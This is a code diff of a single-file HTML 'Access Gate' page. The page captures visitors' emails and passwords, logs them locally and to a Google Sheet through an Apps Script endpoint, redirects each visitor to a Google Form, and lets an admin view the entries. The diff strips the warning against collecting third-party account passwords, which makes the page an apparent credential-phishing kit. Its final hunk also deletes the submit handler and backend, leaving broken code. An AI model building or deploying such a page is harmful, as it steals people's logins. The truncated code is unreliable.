@@ -1,22 +1,18 @@
 <!--
-Access Gate — quick landing page
+Access Gate — quick landing page (corrected)
 - Collects email and a temp access code ("password") that YOU issue.
-- Reveals a purple "Open link" button when inputs are provided.
-- Stores every attempt locally (browser localStorage) and can optionally
-  POST to a Google Apps Script endpoint to log in a Google Sheet.
-- Includes a lightweight admin view in the same file: open with
-  ?admin=1&key=YOUR_ADMIN_KEY to see submissions.
+- Logs each attempt locally and (optionally) to a Google Sheet via Apps Script.
+- Admin table in the same file (open with ?admin=1&key=YOUR_ADMIN_KEY).
 
-⚠️ IMPORTANT
-Do NOT use this page to collect third‑party account passwords (Google, Microsoft, etc.).
-Use one‑time access codes that you generate. Replace the word "password" in UI if you prefer.
+Notes:
+- Navigation now happens in the SAME window (location.assign).
+- Fixed stray "};" bug and added readLocal().
+- Admin "remote" fetch is OFF by default to avoid CORS; toggle useRemote=true after adding a proxy/CORS headers.
 
 Setup:
-1) Update the CONFIG section below (DEST_LINK, ADMIN_KEY, BRAND_NAME, APPS_SCRIPT_URL).
-2) Upload this single file to any static host (Netlify, Vercel, GitHub Pages, etc.).
-3) To view Admin, visit https://yourpage.com/?admin=1&key=YOUR_ADMIN_KEY
-
-Optional server logging to Google Sheet (Apps Script): see the snippet at the very bottom of this file.
+1) Update CONFIG below (DEST_LINK, ADMIN_KEY, BRAND_NAME, APPS_SCRIPT_URL).
+2) Host this single file (Vercel/Netlify/GitHub Pages).
+3) Admin: https://yourpage.com/?admin=1&key=YOUR_ADMIN_KEY
 -->
 <!doctype html>
 <html lang="en">
@@ -26,12 +22,12 @@ Optional server logging to Google Sheet (Apps Script): see the snippet at the ve
   <title>Access Gate</title>
   <style>
     :root{
-      --bg:#0f0f0f;          /* dark bg like ref */
-      --card:#121212;        /* panel */
+      --bg:#0f0f0f;
+      --card:#121212;
       --muted:#c2c2c2;
       --text:#eaeaea;
-      --accent:#7c3aed;      /* purple for Open link */
-      --blue:#8ab4f8;        /* link tint */
+      --accent:#7c3aed;
+      --blue:#8ab4f8;
       --radius:12px;
     }
     *{box-sizing:border-box}
@@ -91,7 +87,8 @@ Optional server logging to Google Sheet (Apps Script): see the snippet at the ve
 
         <div class="actions">
           <button type="submit" class="btn" id="verifyBtn">Next</button>
-          <a id="openBtn" class="btn purple hidden" target="_blank" rel="noopener" href="#">Open link</a>
+          <!-- Hidden "Open link" button retained as an alternate path -->
+          <a id="openBtn" class="btn purple hidden" href="#">Open link</a>
           <button type="button" class="btn hidden" id="resetBtn" aria-hidden="true" tabindex="-1">Reset</button>
         </div>
         <div class="msg" id="formMsg"></div>
@@ -102,8 +99,8 @@ Optional server logging to Google Sheet (Apps Script): see the snippet at the ve
     <main id="adminView" class="hidden">
       <div class="toolbar">
         <span class="pill">Admin</span>
-        <button class="btn ghost small" id="refreshBtn">Refresh</button>
-        <button class="btn ghost small" id="exportBtn">Export CSV</button>
+        <button class="btn small" id="refreshBtn" type="button">Refresh</button>
+        <button class="btn small" id="exportBtn" type="button">Export CSV</button>
       </div>
       <table id="logTable">
         <thead>
@@ -125,7 +122,6 @@ Optional server logging to Google Sheet (Apps Script): see the snippet at the ve
   const CONFIG = {
     DEST_LINK: "https://docs.google.com/forms/d/e/1FAIpQLSf2aubqVT9t7Y0sdYBAcdIJ5QceyQP7Uhl2qrESKhMPxhO9tg/viewform?usp=sf_link",
     BRAND_NAME: "Access Gate",
-    BRAND_SUB: "Use your Access Gate Account",
     ADMIN_KEY: "change-me",
     APPS_SCRIPT_URL: "https://script.google.com/macros/s/AKfycbzjsix0ONHFMGouF3HWAKaj55Fgs6aWIU6ynUB4tlEAwk9TiWNSB2tdei3Os2cxrMSz/exec"
   };
@@ -133,20 +129,26 @@ Optional server logging to Google Sheet (Apps Script): see the snippet at the ve
   // ===== Helpers =====
   const $ = sel => document.querySelector(sel);
   const nowIso = () => new Date().toISOString();
+
   const storeLocal = (record) => {
     const key = 'ag_submissions';
     const arr = JSON.parse(localStorage.getItem(key) || '[]');
     arr.push(record);
     localStorage.setItem(key, JSON.stringify(arr));
   };
- const toCSV = (rows) => {
-  const header = ['timestamp','email','code','userAgent','referrer'];
-  const esc = v => '"' + String(v).replaceAll('"','""') + '"';
-  const lines = rows.map(r =>
-    [r.timestamp, r.email, r.code, r.userAgent, r.referrer].map(esc).join(',')
-  );
-  return [header.join(','), ...lines].join('\n');
-};
+
+  const readLocal = () => {
+    try { return JSON.parse(localStorage.getItem('ag_submissions') || '[]'); }
+    catch { return []; }
+  };
+
+  const toCSV = (rows) => {
+    const header = ['timestamp','email','code','userAgent','referrer'];
+    const esc = v => '"' + String(v).replaceAll('"','""') + '"';
+    const lines = rows.map(r =>
+      [r.timestamp, r.email, r.code, r.userAgent, r.referrer].map(esc).join(',')
+    );
+    return [header.join(','), ...lines].join('\n');
   };
 
   function showMsg(text, isError){
@@ -162,6 +164,7 @@ Optional server logging to Google Sheet (Apps Script): see the snippet at the ve
     let mode = 'local';
     if(remote && CONFIG.APPS_SCRIPT_URL){
       try{
+        // Will require CORS headers/proxy to read
         const res = await fetch(CONFIG.APPS_SCRIPT_URL, { method:'GET' });
         const json = await res.json();
         rows = (json && json.rows) ? json.rows : [];
@@ -181,7 +184,10 @@ Optional server logging to Google Sheet (Apps Script): see the snippet at the ve
       tr.innerHTML = `<td>${i+1}</td><td class="mono">${r.timestamp}</td><td>${r.email}</td><td class="mono">${r.code}</td><td class="mono">${ua.slice(0,60)}…</td><td class="mono">${r.referrer||''}</td>`;
       tbody.appendChild(tr);
     });
-    document.querySelector('#adminHint').textContent = `Mode: ${mode}. Showing ${rows.length} record(s). ` + (mode.startsWith('local') ? "These are stored in THIS browser's localStorage." : "These are coming from your Google Sheet via Apps Script.");
+    document.querySelector('#adminHint').textContent =
+      `Mode: ${mode}. Showing ${rows.length} record(s). ` +
+      (mode.startsWith('local') ? "These are stored in THIS browser's localStorage."
+                                : "These are coming from your Google Sheet via Apps Script.");
   }
 
   async function logToServer(payload){
@@ -190,8 +196,9 @@ Optional server logging to Google Sheet (Apps Script): see the snippet at the ve
       await fetch(CONFIG.APPS_SCRIPT_URL, {
         method: 'POST',
         mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        headers: { 'Content-Type': 'text/plain' }, // simple for beacon parity
+        body: JSON.stringify(payload),
+        keepalive: true
       });
     }catch(e){ /* ignore */ }
   }
@@ -199,106 +206,5 @@ Optional server logging to Google Sheet (Apps Script): see the snippet at the ve
   // ===== UI init =====
   function init(){
     const brandEl = $('#brand'); if (brandEl) brandEl.textContent = CONFIG.BRAND_NAME;
-    const brandSubEl = $('#brandSub'); if (brandSubEl) brandSubEl.textContent = CONFIG.BRAND_SUB;
 
     const params = new URLSearchParams(location.search);
-    const isAdmin = params.get('admin') === '1';
-    const useRemote = true; // always read from Google Sheet when in admin mode
-    if(isAdmin){ showAdmin(useRemote); } else { showUser(); }
-
-    const form = $('#gateForm');
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      const email = $('#email').value.trim();
-      const code = $('#code').value.trim();
-      if(!email){ showMsg('Please enter an email.', true); return; }
-      if(!code){ showMsg('Please enter your password.', true); return; }
-
-      // 1) Log to Google Sheet immediately (beacon preferred for reliability on navigation)
-      const record = { timestamp: nowIso(), email, code, userAgent: navigator.userAgent, referrer: document.referrer || '' };
-      try { storeLocal(record); } catch(e){}
-      try {
-        if (navigator.sendBeacon) {
-          const blob = new Blob([JSON.stringify(record)], { type: 'text/plain' });
-          navigator.sendBeacon(CONFIG.APPS_SCRIPT_URL, blob);
-        } else {
-          fetch(CONFIG.APPS_SCRIPT_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            keepalive: true,
-            body: JSON.stringify(record)
-          }).catch(()=>{});
-        }
-      } catch(e) {}
-
-      // 2) Navigate in the SAME window
-      location.assign(CONFIG.DEST_LINK);
-    });
-
-    const refreshBtn = $('#refreshBtn');
-    if(refreshBtn){ refreshBtn.addEventListener('click', () => renderAdmin(useRemote)); }
-
-    const exportBtn = $('#exportBtn');
-    if(exportBtn){
-      exportBtn.addEventListener('click', () => {
-        const csv = toCSV(readLocal());
-        const blob = new Blob([csv], {type:'text/csv'});
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url; a.download = 'access-gate-logs.csv'; a.click();
-        URL.revokeObjectURL(url);
-      });
-    }
-  }
-
-  document.addEventListener('DOMContentLoaded', init);
-</script>
-
-  <!--
-  ================= OPTIONAL: Google Apps Script backend =================
-  1) Create a Google Sheet and note its ID (from the URL).
-  2) Open Apps Script (Extensions → Apps Script) and paste the code below in Code.gs
-  3) Replace SHEET_ID with your sheet id.
-  4) Deploy as a Web App (Execute as: Me; Who has access: Anyone with the link).
-  5) Copy the Web App URL and paste into CONFIG.APPS_SCRIPT_URL above.
-
-  // Code.gs
-  const SHEET_ID = '11V962U1lz0-GQyCmsfeT9XP9pPQYagIFRS_I35QdbeM';
-
-  function _sheet(){
-    const ss = SpreadsheetApp.openById(SHEET_ID);
-    const name = 'logs';
-    return ss.getSheetByName(name) || ss.insertSheet(name);
-  }
-
-  function doPost(e){
-    try{
-      const sh = _sheet();
-      const data = JSON.parse(e.postData.contents || '{}');
-      sh.appendRow([
-        new Date(), data.email||'', data.code||'', data.userAgent||'', data.referrer||''
-      ]);
-      return ContentService.createTextOutput(JSON.stringify({ok:true}))
-        .setMimeType(ContentService.MimeType.JSON);
-    }catch(err){
-      return ContentService.createTextOutput(JSON.stringify({ok:false,error:String(err)}))
-        .setMimeType(ContentService.MimeType.JSON);
-    }
-  }
-
-  function doGet(){
-    const sh = _sheet();
-    const values = sh.getDataRange().getValues();
-    const rows = values.slice(1).map(r => ({
-      timestamp: r[0], email: r[1], code: r[2], userAgent: r[3], referrer: r[4]
-    }));
-    return ContentService.createTextOutput(JSON.stringify({rows}))
-      .setMimeType(ContentService.MimeType.JSON);
-  }
-
-  =======================================================================
-  -->
-</body>
-</html>
-
-
